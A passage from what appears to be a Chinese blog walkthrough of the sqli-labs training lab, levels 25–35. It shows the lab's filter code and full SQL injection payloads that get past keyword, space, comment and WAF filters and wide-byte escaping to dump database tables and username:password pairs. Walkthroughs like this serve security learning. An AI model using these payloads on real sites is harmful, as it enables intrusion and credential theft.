<p><code>?id=1</code><br>返回正常<br><code>?id=1&#39;</code><br>返回错误<br>因此可以以这种方式注入<code> ?id=1&#39; --+ </code><br>但要注意，语句中存在or字符时，需要写成oorr，这样中间的or被替换为空字符后，剩下的字符仍然能构成or<br>and字符也是同理<br>By the way, 函数只是把or和and字符过滤，但和or字符相同含义的||没有被过滤，and字符相同含义的&amp;&amp;没有被过滤。因此有时也可用||和&amp;&amp;代替。</p>
<ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;oorrder by 4 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),version() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username,&#x27;:&#x27;,passwoorrd) from users --+</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>第25a关<br>与25关类似，只是没有单引号</li>
</ul>
<h2 id="26-26a-括号绕过空格的报错注入或联合注入"><a href="#26-26a-括号绕过空格的报错注入或联合注入" class="headerlink" title="26-26a(括号绕过空格的报错注入或联合注入)"></a>26-26a(括号绕过空格的报错注入或联合注入)</h2><ol>
<li>测试并判断注入类型<br>源码审计<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);     <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//strip out /*</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out --</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);     <span class="comment">//Strip out #</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out slashes</span></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
我们可以看到，这一次，不仅仅是or与and，还多过滤了好几种情况<br>我们只需要绕过即可，对于空格有几种方式：</li>
</ol>
<ul>
<li>编码绕过<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%09 TAB键（空格）  %0A 新建一行（空格）</span><br><span class="line">%0C 新的一页       %0D return即回车功能（php-5.2.17,5.3.29成功）</span><br><span class="line">%0B TAB键（垂直）  %A0 空格（php-5.2.17成功）</span><br></pre></td></tr></table></figure></li>
<li>括号绕过<br>用()绕过，不使用任何空格</li>
<li>以上方法不一定都对自己的配置有效，需要尝试</li>
</ul>
<ul>
<li>第1种<br>这里使用()的方式绕过空格</li>
</ul>
<ol start="2">
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(version())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;security&#x27;)),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=&#x27;users&#x27;)),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&#x27;||updatexml(1,concat(&#x27;~&#x27;,(select(concat(&#x27;~&#x27;,id,&#x27;~&#x27;,username,&#x27;~&#x27;,passwoorrd))from(users)limit%0b0,1)),0)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>第2种<br>这里使用%0b的方式绕过空格，%26%26绕过and</li>
</ul>
<ol start="2">
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&#x27;%0bunion%0bselect%0b1,database(),3%26%26&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=&#x27;%0bunion%0bselect%0b1,version(),3%26%26&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&#x27;union%0bselect%0b1,group_concat(table_name),3%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=&#x27;security&#x27;%26%26%0b&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=&#x27;union%0bselect%0b1,group_concat(column_name),3%0bfrom%0binfoorrmation_schema.columns%0bwhere%0btable_schema=&#x27;security&#x27;%0baandnd%0btable_name=&#x27;users&#x27;%26%26%0b&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&#x27;union%0bselect%0b1,group_concat(username,0x7e,passwoorrd),3%0bfrom%0busers%0bwhere%0b&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>第26a关<br>与26关相比，只是闭合方式变更为’)</li>
</ul>
<h2 id="27-27a-大小写绕过或双写绕过的报错注入"><a href="#27-27a-大小写绕过或双写绕过的报错注入" class="headerlink" title="27-27a(大小写绕过或双写绕过的报错注入)"></a>27-27a(大小写绕过或双写绕过的报错注入)</h2><ol>
<li><p>测试并判断注入类型<br>本关通过查看源码可知，select和union被过滤了，但and和or这次没被过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>问题不大，可以通过大小写或重写绕过</p>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(database())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(version())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;security&#x27;),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;users&#x27;),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(concat(username,&#x27;:&#x27;,password))from(users)limit%0b0,1)),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>第27a关<br>与27关相比，只是闭合方式变更为”</li>
</ul>
<h2 id="28-28a-双写或加字符绕过的联合注入"><a href="#28-28a-双写或加字符绕过的联合注入" class="headerlink" title="28-28a(双写或加字符绕过的联合注入)"></a>28-28a(双写或加字符绕过的联合注入)</h2><ol>
<li>测试并判断注入类型<br>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);					<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);	   		 	//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
绕过union和select，选择重写或加字符绕过<br>末尾选择字符串截断%00<br>或<code>%0aand(&#39;1</code></li>
</ol>
<h1 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h1><ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)%0Aorder%0Aby%0A4%0Aand(&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;)%0aunion%0aunion%0aselectselect%0a1,2,3%0aand(&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,database(),3%0aand(&#x27;1</span><br><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,version(),3%0aand(&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,2,group_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=&#x27;security&#x27;%0aand(&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,2,group_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_name=&#x27;users&#x27;%0aand(&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0&#x27;)%0buniOn%0bsElEct%0b1,(group_concat(username,0x7e,password)),3%0bfrom%0busers%0bwhere%0b(&#x27;1&#x27;)=(&#x27;1</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>第28a关<br>与28关相比，只是过滤条件少了几个</li>
</ul>
<h2 id="29-31-绕过WAF的联合注入"><a href="#29-31-绕过WAF的联合注入" class="headerlink" title="29-31(绕过WAF的联合注入)"></a>29-31(绕过WAF的联合注入)</h2><ol>
<li><p>测试并判断注入类型<br>先进行常规操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; order by 4 --+  出现报错</span><br><span class="line">?id=-1&#x27;union select 1,2,3 --+  爆出显示位</span><br></pre></td></tr></table></figure>
<p>但当我们进入login.php页面，再继续注入时</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">login.php?id=1&#x27; --+</span><br></pre></td></tr></table></figure>
<p>页面跳转<br><img src="/simg/sqli-labs_29.png" alt="显示"><br>这里是部署了WAF<br>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。<br>详细解释：<a href="https://baike.baidu.com/item/WAF/3239498">WAF</a><br>第一个参数被WAF所检查，但第二个参数不会，因此我们可以加入第二个参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=2</span><br></pre></td></tr></table></figure>
</li>
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=2&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,database(),version() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password),3 from users --+</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>第30关<br>与第29关差不多，只是闭合方式从’变更为”</p>
</li>
<li><p>第31关<br>与第29关差不多，只是闭合方式从”变更为”)</p>
</li>
</ul>
<h2 id="32-33-GET方式的宽字节注入"><a href="#32-33-GET方式的宽字节注入" class="headerlink" title="32-33(GET方式的宽字节注入)"></a>32-33(GET方式的宽字节注入)</h2><ol>
<li>测试并判断注入类型<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;  发现被转义为了 1\&#x27;</span><br></pre></td></tr></table></figure>
查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>);          <span class="comment">//escape any backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
复习一下，<br>preg_replace()函数执行一个正则表达式的搜索和替换。详细：<a href="https://www.runoob.com/php/php-preg_replace.html">PHP preg_replace() 函数</a><br>preg_quote()函数用于转义正则表达式字符。详细：<a href="https://www.runoob.com/php/php-preg_quote.html">PHP preg_quote() 函数</a><br>因此，我们无法用单引号双引号闭合注入<br>但源码中还有一句引起了注意：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql_query(&quot;SET NAMES gbk&quot;);</span><br></pre></td></tr></table></figure>
这里表明是使用gbk编码，那么我们可以尝试使用宽字节注入。</li>
</ol>
<ul>
<li>当某字符的大小为一个字节时，称其字符为窄字节.</li>
<li>当某字符的大小为两个字节时，称其字符为宽字节.</li>
<li>所有英文默认占一个字节，汉字占两个字节</li>
<li>常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等等<br>宽字节的格式是在地址后先加一个%df，再加单引号，因为反斜杠的编码为%5c，而在GBK编码中，%df%5c是繁体字“連”，所以这时，单引号成功逃逸。<br>宽字节注入情况：</li>
<li>客户端、连接层、结果集 都是GBK编码</li>
<li>使用iconv进行字符集转换，将UTF-8转为GBK，同时，set names字符集为GBK。提交%e9%8c%a6即可。</li>
<li>使用set names UTF-8指定了UTF-8字符集，并且也使用转义函数进行转义。有时候，为了避免乱码，会将一些用户提交的GBK字符使用iconv函数（或者mb_convert_encoding）先转为UTF-8，然后再拼接入SQL语句。</li>
</ul>
<p>注意：<br>页面默认是utf-8，如果想看显示效果需要更改页面编码，我这里是用到了chrome的扩展商店的插件，具体可看下面这篇文章<br><a href="https://www.munue.com/172.html#:~:text=%E5%8F%B3%E9%94%AE%E7%82%B9%E5%87%BB%E5%9B%BE%E6%A0%87%EF%BC%8C%E6%89%93%E5%BC%80%E9%80%89%E9%A1%B9,%E8%BF%9B%E8%A1%8C%E9%80%89%E6%8B%A9%E5%92%8C%E8%AE%BE%E7%BD%AE%E7%BC%96%E7%A0%81%E3%80%82">Google Chrome 浏览器如何设置网页编码</a></p>
<p>最终，我们构造该语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%df&#x27;</span><br></pre></td></tr></table></figure>
<p>页面显示效果如下<br><img src="/simg/sqli-labs_32.png" alt="显示效果"></p>
<ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%df&#x27;order by 4 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27;union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,database(),version() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,(select group_concat(0x7e,id,0x7e,username,0x7e,password) from users) --+</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>第33关<br>和第32关本质是一样的，只是源码用了addslashes()函数<br>addslashes()函数：addslashes() 函数返回在预定义的字符前添加反斜杠的字符串<br>预定义字符是：</li>
<li>单引号（’）</li>
<li>双引号（”）</li>
<li>反斜杠（\）</li>
<li>NULL<br>注入方式相同，这里不再重复</li>
</ul>
<h2 id="34-POST方式的宽字节注入"><a href="#34-POST方式的宽字节注入" class="headerlink" title="34(POST方式的宽字节注入)"></a>34(POST方式的宽字节注入)</h2><p>有两种方案：</p>
<ul>
<li>第1种</li>
</ul>
<ol>
<li><p>测试并判断注入类型<br>和之前的32，33关差别不大，但是这回是POST提交方式<br>因为在url栏中输入 %df 主要是以 16进制形式输入，而在输入框输入 %df 则是以普通字符串输入的。<br>所以我们需要略作改变<br>绕过方法：有些汉字的编码为三个字节的编码，我们将三个字节拆开来看，前两个为一组，后面的那个和 \ 相编码为两字节绕过，从而使得单引号逃逸</p>
</li>
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汉&#x27; order by 3 #</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汉&#x27; union select 1,2 #</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汉&#x27; union select version(),database() #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汉&#x27; union select 1,table_name from information_schema.tables where table_schema= database() limit 3,1 #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汉&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汉&#x27; union select 1,(select group_concat(username,0x3a,password) from users) #</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>第2种</li>
</ul>
<ol>
<li><p>测试并判断注入类型<br>既然在输入栏不能直接输入，我们可以通过burp抓包来注入。</p>
</li>
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; order by 3 #</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; union select 1,2 #</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; union select version(),database() #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; union select 1,table_name from information_schema.tables where table_schema= database() limit 3,1 #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; union select 1,(select group_concat(username,0x3a,password) from users) #</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>burp注入的另一种方案，在Hex栏修改16进制注入为df。<br>可参见：<a href="https://blog.csdn.net/m0_62879498/article/details/122558222">sql-lab (32~35)包含对 宽字节注入的原理理解及注意事项</a><br>虽然不算很实用的方法，但也不失为一种有趣的思路。</li>
</ul>
<h2 id="35-数字型的联合注入"><a href="#35-数字型的联合注入" class="headerlink" title="35(数字型的联合注入)"></a>35(数字型的联合注入)</h2><ol>
<li><p>测试并判断注入类型<br>查看源码</p>
